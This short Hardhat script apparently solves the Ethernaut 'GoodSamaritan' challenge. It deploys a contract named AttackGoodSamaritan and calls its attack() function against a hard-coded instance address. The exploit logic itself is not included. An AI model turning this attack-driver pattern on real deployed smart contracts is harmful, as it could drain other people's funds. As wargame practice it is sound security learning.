const { ethers } = require("hardhat");

async function main() {
  const [owner, otherAccount] = await ethers.getSigners();
  // attach your instance address
  const Instance = "0x7E9625a95c8E6385931240948E478a551158860E";
  const AttackGoodSamaritanContract = await ethers.getContractFactory(
    "AttackGoodSamaritan"
  );
  const AttackGoodSamaritan = await AttackGoodSamaritanContract.deploy();
  await AttackGoodSamaritan.deployed();
  console.log(AttackGoodSamaritan.address);
  const tx = await AttackGoodSamaritan.attack(Instance);
  console.log(tx);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
